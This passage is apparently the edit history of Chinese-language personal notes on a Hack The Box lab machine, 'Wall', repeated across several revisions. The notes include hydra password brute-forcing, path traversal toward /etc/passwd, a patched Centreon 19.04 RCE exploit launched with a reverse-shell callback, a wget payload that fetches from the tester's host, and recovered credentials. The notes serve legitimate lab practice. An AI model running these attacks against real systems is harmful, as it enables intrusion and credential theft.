\n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\npython3.6 47069.py http://10.10.10.157/centreon admin passwd1 10.10.14.10 1330\n\n```\n[+] Retrieving CSRF token to submit the login form\n47069.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  soup = BeautifulSoup(html_content)\n[+] Login token is : 184639f4656756696eb3efd175cdee66\n[+] Logged In Sucssfully\n[+] Retrieving Poller token\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\nexp:[https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1234\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙\n\n## 存在的漏洞\n\ncentreon 19.04 rce\napache目录遍历。\n",[[1570371629061,["whale@Whale",[[1,4072,"\n"]],[4071,4071],[4072,4072]]],[1570371629634,["whale@Whale",[[1,4072,"http://10.10.10.157/centreon/main.get.php?p=60901"]],[4072,4072],[4121,4121]]],[1570371992748,["whale@Whale",[[1,4072,"\n"]],[4071,4071],[4072,4072]]],[1570371994050,["whale@Whale",[[1,4072,"nagios_bin参数"]],[4072,4072],[4084,4084]]],[1570372061314,["whale@Whale",[[1,4085,"\n"]],[4084,4084],[4085,4085]]]]],["1039b927-ab51-458e-9977-eaf645dba60e",1570445331120,"157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n## enumeration\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\n\n### enumeration\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\npython3.6 47069.py http://10.10.10.157/centreon admin passwd1 10.10.14.10 1330\n\n```\n[+] Retrieving CSRF token to submit the login form\n47069.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  soup = BeautifulSoup(html_content)\n[+] Login token is : 184639f4656756696eb3efd175cdee66\n[+] Logged In Sucssfully\n[+] Retrieving Poller token\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\nexp:[https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1234\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nnagios_bin参数\n\nhttp://10.10.10.157/centreon/main.get.php?p=60901\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙\n\n## 存在的漏洞\n\ncentreon 19.04 rce\napache目录遍历。\n",[[1570445292195,["whale@Whale",[[1,1334,"\n"]],[1333,1333],[1334,1334]]],[1570445303524,["whale@Whale",[[1,1334,"get改post请求，页面"]],[1334,1334],[1347,1347]]],[1570445304447,["whale@Whale",[[-1,1345,"页面"]],[1347,1347],[1345,1345]]],[1570445308906,["whale@Whale",[[1,1345,"绕过登陆页面，"]],[1345,1345],[1352,1352]]],[1570445309741,["whale@Whale",[[-1,1351,"，"]],[1352,1352],[1351,1351]]],[1570445310487,["whale@Whale",[[1,1351,"。"]],[1351,1351],[1352,1352]]],[1570445310665,["whale@Whale",[[1,1353,"\n"]],[1352,1352],[1353,1353]]],[1570445329495,["whale@Whale",[[1,1660,"`"]],[1660,1660],[1661,1661]]],[1570445332112,["whale@Whale",[[1,1739,"`"]],[1739,1739],[1740,1740]]],[1570445350693,["whale@Whale",[[1,1742,"\n"]],[1741,1741],[1742,1742]]],[1570445351386,["whale@Whale",[[1,1742,"x"]],[1742,1742],[1743,1743]]],[1570445351940,["whale@Whale",[[-1,1742,"x"]],[1743,1743],[1742,1742]]],[1570445353795,["whale@Whale",[[1,1742,"修改"]],[1742,1742],[1744,1744]]],[1570445360685,["whale@Whale",[[-1,1742,"修改"]],[1744,1744],[1742,1742]]],[1570445363319,["whale@Whale",[[1,1742,"修改exp."]],[1742,1742],[1748,1748]]],[1570445364181,["whale@Whale",[[-1,1747,"."]],[1748,1748],[1747,1747]]],[1570445364582,["whale@Whale",[[1,1747,"。"]],[1747,1747],[1748,1748]]],[1570445365814,["whale@Whale",[[1,1749,"\n"]],[1748,1748],[1749,1749]]],[1570445377660,["whale@Whale",[[1,1742,"执行后报错，于是"]],[1742,1742],[1750,1750]]],[1570445408748,["whale@Whale",[[-1,2113,"The code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n\n  soup = BeautifulSoup(html_content)\n[+] Login token is : 184639f4656756696eb3efd175cdee66\n[+] Logged In Sucssfully\n[+] Retrieving Poller token\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\n"]],[2112,2915],[2112,2112]]],[1570445423771,["whale@Whale",[[-1,1864,"specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\n\n"]],[2045,2113],[1864,1864]]],[1570445428633,["whale@Whale",[[-1,1762,"[+] Retrieving CSRF token to submit the login form\n47069.py:38: UserWarning: No parser was explicitly \n"]],[1762,1865],[1762,1762]]],[1570445429823,["whale@Whale",[[1,1762,"\n"]],[1762,1762],[1763,1763]]],[1570445433627,["whale@Whale",[[1,1762,"。。。。。。"]],[1762,1762],[1768,1768]]],[1570445470835,["whale@Whale",[[-1,2122,"https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py"]],[2122,2262],[2122,2122]]],[1570445477661,["whale@Whale",[[1,2122,"exp下载地址"]],[2122,2122],[2129,2129]]],[1570445480946,["whale@Whale",[[-1,2117,"exp:"]],[2121,2121],[2117,2117]]],[1570445519909,["whale@Whale",[[-1,4365,"。"]],[4366,4366],[4365,4365]]]]],["0d7c8c92-b8a2-4998-b83d-15562b115b13",1571732061643,"157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n## enumeration\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\n\n### enumeration\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\nget改post请求，绕过登陆页面。\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\n`python3.6 47069.py http://10.10.10.157/centreon admin passwd1 10.10.14.10 1330`\n\n执行后报错，于是修改exp。\n\n```\n。。。。。。\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\n[exp下载地址](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1234\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nnagios_bin参数\n\nhttp://10.10.10.157/centreon/main.get.php?p=60901\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙\n\n## 存在的漏洞\n\ncentreon 19.04 rce\napache目录遍历\n",[[1571732049636,["whale@Whale",[[1,0,"10.10.10."]],[0,0],[9,9]]],[1571732068890,["whale@Whale",[[1,0,"Q"]],[0,0],[1,1]]],[1571732069797,["whale@Whale",[[-1,0,"Q"]],[1,1],[0,0]]],[1571732071878,["whale@Whale",[[1,0,"Wall-"]],[0,0],[5,5]]]]],["b5343867-4d70-4df3-8f6d-c247a9af6e2e",1572262073227,"Wall-10.10.10.157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n## enumeration\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\n\n### enumeration\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\nget改post请求，绕过登陆页面。\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\n`python3.6 47069.py http://10.10.10.157/centreon admin passwd1 10.10.14.10 1330`\n\n执行后报错，于是修改exp。\n\n```\n。。。。。。\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n\n```\n\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\n[exp下载地址](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.10 1234\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nnagios_bin参数\n\nhttp://10.10.10.157/centreon/main.get.php?p=60901\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L /usr/share/wordlists/rockyou.txt  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l centreon  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\"\n\nhydra -l admin  -P /usr/share/wordlists/rockyou.txt -V -s 80 10.10.10.157 http-post-form \"/centreon/index.php:useralias=^USER^&password=^PASS^&submitLogin=Connect&centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.\" -t 4\n\nadmin/password1\ncentreon/#1bitch\n\n触及到了防火墙\n\n## 存在的漏洞\n\ncentreon 19.04 rce\napache目录遍历\n",[[1572262040569,["whale@Whale",[[-1,2002,"\n"]],[2002,2002],[2001,2001]]],[1572262041449,["whale@Whale",[[-1,2006,"\n"]],[2006,2006],[2005,2005]]],[1572262045722,["whale@Whale",[[-1,2380,"\n"]],[2380,2380],[2379,2379]]],[1572262047016,["whale@Whale",[[1,2380,"\n"]],[2379,2379],[2380,2380]]],[1572262164510,["whale@Whale",[[-1,2362,"0"]],[2363,2363],[2362,2362]]],[1572262165482,["whale@Whale",[[1,2362,"8"]],[2362,2362],[2363,2363]]],[1572262166752,["whale@Whale",[[-1,2364,"1234"]],[2368,2368],[2364,2364]]],[1572262167704,["whale@Whale",[[1,2364,"8080"]],[2364,2364],[2368,2368]]]]],["09dcc7b9-17d3-47e0-87f0-49f18f71d08b",1572853248063,"Wall-10.10.10.157\n===\n参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)\n\n## enumeration\n22，80\n\nApache/2.4.29 (Ubuntu) Server \n\n![1]($res/1.PNG)\n说明用户名可能是admin\n\ncd /usr/share/wordlists\n hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n hydra -l admin -P 3000-pass.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n hydra -l aa -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n\n## ssh\nOpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n\n![6]($res/6.PNG)\n\n---\nsearchsploit -m exploits/linux/remote/45233.py\npython 45233.py（type error代码错误）\n\nsearchsploit -m exploits/linux/remote/45210.py\npython 45210.py (TypeError)\n\nsearchsploit -m exploits/linux/remote/45939.py\npython 45939.py --port 22 10.10.10.157 root（TypeError: an integer is required）\n\n---\nhydra -l admin -P rockyou.txt 10.10.10.157 ssh\n\n## web\n\n### enumeration\ndirb http://10.10.10.157 -X .php\n存在的目录\nhttp://10.10.10.157/aa.php\nhttp://10.10.10.157/monitoring/\nhttp://10.10.10.157/panel.php\ns....-s....\ncentreon\n\nnikto -h http://10.10.10.157\nGET, POST, OPTIONS, HEAD \n\n---\n10.10.10.157/monitoring/../panel.php\n跳转到panel.php\n\n10.10.10.157/monitoring/../../../../../../../../../etc/passwd\n无效\n\n---\n\nget改post请求，绕过登陆页面。\n\n![7]($res/7.PNG)\nsearchsploit centreon\nsearchsploit -m exploitdb/exploits/php/webapps/47069.py\nv. 19.04.0\n\n参考资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)\n\n![8]($res/8.PNG)\n\n![9]($res/9.PNG)\n\n`python3.6 47069.py http://10.10.10.157/centreon admin passwd1 10.10.14.10 1330`\n\n执行后报错，于是修改exp。\n\n```\n。。。。。。\n  poller_soup = BeautifulSoup(poller_html)\nTraceback (most recent call last):\n  File \"47069.py\", line 57, in <module>\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\nIndexError: list index out of range\n```\n![10]($res/10.PNG)\n\npoller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')\n\n![11]($res/11.PNG)\n\n[exp下载地址](https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py)\n\npython3 centreon-exploit.py http://10.10.10.157/centreon admin passwd 10.10.14.18 8080\n\n反弹shell失败\n\n---\nhttp://10.10.10.157/centreon/Themes/Centreon-2/\n\n![12]($res/12.PNG)\n目录遍历漏洞\n\n2\\. API is never worthless\n3.CVE x2\n\n---\n+ http://10.10.10.157/centreon/a.php (CODE:200|SIZE:1)                                                   \n+ http://10.10.10.157/centreon/index.php (CODE:200|SIZE:3091)                                            \n+ http://10.10.10.157/centreon/main.php (CODE:302|SIZE:0)   \nhttp://10.10.10.157/centreon/main.php?p=60901&o=c&server_id=1\nnagios_bin参数\n\nhttp://10.10.10.157/centreon/main.get.php?p=60901\nhttp://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php\n\n---\n\n19.04 版本漏洞\n[https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html](https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html)\n\nCookie: PHPSESSID=smg43q7s4sc1cmd1p5c5qaf3qm\n\nredirect=%27%27&useralias=admin&password=passwd&submitLogin=Connect&centreon_token=63e8a72514a7cb7f6c463d5afefb3784\n\n---\n测试命令执行是否成功，修改payload为\n```\nwget http://10.10.14.10:888/1.txt #\n```\n失败\n![13]($res/13.PNG)\n\n---\n\nhydra -L 